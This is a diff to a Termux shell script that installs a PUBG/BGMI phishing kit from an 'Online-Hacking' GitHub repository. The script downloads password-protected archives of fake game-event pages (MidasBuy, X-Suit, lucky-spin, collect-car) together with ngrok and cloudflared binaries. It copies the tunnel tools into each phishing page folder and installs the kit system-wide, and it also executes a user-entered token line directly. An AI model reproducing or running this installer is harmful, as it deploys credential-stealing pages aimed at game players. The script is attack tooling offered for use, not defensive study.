@@ -107,30 +107,13 @@ pkg install gem -y
 gem install lolcat
 clear
 echo""
-echo -e "\e[1;96m========================================================= > > >\e[m "
-echo " "
-printf "\e[1;31m[\e[0m\e[1;92m01\e[0m\e[1;31m] \e[0m\e[1;37;44m Install Ngrok Old Version \e[0m \e[93m Customise  \e[0m  "  
-echo
-printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"     
-echo
-printf "\e[1;31m[\e[0m\e[1;92m02\e[0m\e[1;31m] \e[0m\e[1;37;41m Install Ngrok Latest Version \e[0m   "  
-echo
-printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
-echo " "
-echo -e "\e[1;96m========================================================= > > >\e[m "
 echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         Download Link Services         !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
 echo ""
-read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m You Want to Choose Ngrok Version : \e[1;91m (default:1) : \e[0m' option
-echo""
-echo""
-echo""
-if [[ $option == *'1'* ]]; then
-wget https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/Ngrok/Ngrok%20Old/ngrok
-fi
-if [[ $option == *'2'* ]]; then
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip
-unzip ngrok-stable-linux-386.zip
-fi
+wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/Ngrok/Ngrok%20Old/ngrok -O ngrok
+wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
 echo""
 clear
 echo ""
@@ -139,15 +122,15 @@ echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   --------------------
 echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!          DOWNLOAD TOOL FILE          !!\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
 echo ""
-wget https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/PUBG-BGMI/SUMAN-PUBG.rar
-wget https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/PUBG-BGMI/SUMAN-BGMI.rar
+wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/PUBG-BGMI/SM/newsite/SUMAN-PUBG.rar -O SUMAN-PUBG.rar
+wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/PUBG-BGMI/SM/newsite/SUMAN-BGMI.rar -O SUMAN-BGMI.rar
 unrar x -Password SUMAN-PUBG.rar
 unrar x -Password SUMAN-BGMI.rar
 rm -rf SUMAN-PUBG.rar SUMAN-BGMI.rar
 chmod +x ngrok
+chmod +x cloudflared
 chmod +x PUBG
 chmod +x BGMI
-chmod +x Run-Ngrok
 clear
 echo ""
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
@@ -163,34 +146,33 @@ sleep 1
 echo ""
 read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
 $token
+echo ""
 sleep1
 echo
-cp -R ngrok SUMAN/Collect-EVENT-LINE/
-cp -R ngrok SUMAN/Collect-MC-Larent-Car/
-cp -R ngrok SUMAN/Lucky-Spin-Godzila-S19/
-cp -R ngrok SUMAN/MidasBuy/
-cp -R ngrok SUMAN/SPIN-EVENT/
-cp -R ngrok SUMAN/X-Suit/
-cp -R ngrok SUMAN1/COLLECT-S19-ID/
-cp -R ngrok SUMAN1/Godzilla-LuckySpin/
-cp -R ngrok SUMAN1/RPS19-COLLECT/
-cp -R ngrok SUMAN1/X-Suit-LuckySpin/
+cp -R cloudflared ngrok SUMAN/X-Suit/
+cp -R cloudflared ngrok SUMAN/Avalanche-X-Suit-LuckySpin/
+cp -R cloudflared ngrok SUMAN/MidasBuy/
+cp -R cloudflared ngrok SUMAN/RP-Month-6-event/
+cp -R cloudflared ngrok SUMAN/Collect-Car-event/
+cp -R cloudflared ngrok SUMAN1/Collect-MC-Larent-Car/
+cp -R cloudflared ngrok SUMAN1/SPIN-EVENT/
+cp -R cloudflared ngrok SUMAN1/Collect-EVENT-LINE/
+cp -R cloudflared ngrok SUMAN1/Lucky-Spin-Godzila-S19/
+cp -R cloudflared ngrok SUMAN1/Godzilla-LuckySpin/
 chmod 7777 PUBG-BGMI_Phishing
-clear
-echo
 clear
 echo
 echo
 cp -R ngrok /data/data/com.termux/files/usr/bin
+cp -R cloudflared /data/data/com.termux/files/usr/bin
 cp -R SUMAN /data/data/com.termux/files/usr/bin
 cp -R SUMAN1 /data/data/com.termux/files/usr/bin
 cp -R PUBG /data/data/com.termux/files/usr/bin
 cp -R BGMI /data/data/com.termux/files/usr/bin
 cp -R PUBG-BGMI_Phishing /data/data/com.termux/files/usr/bin
-cp -R Run-Ngrok /data/data/com.termux/files/usr/bin
 cp -R OnlineHacking /data/data/com.termux/files/usr/bin
 echo
-rm -rf SUMAN SUMAN1 PUBG-BGMI_Phishing 
+rm -rf SUMAN SUMAN1 
 echo
 echo -e "\e[35m[+] Connect Online Hacking PUBG BGMI Hacking Server......  \e[m "
 sleep 2
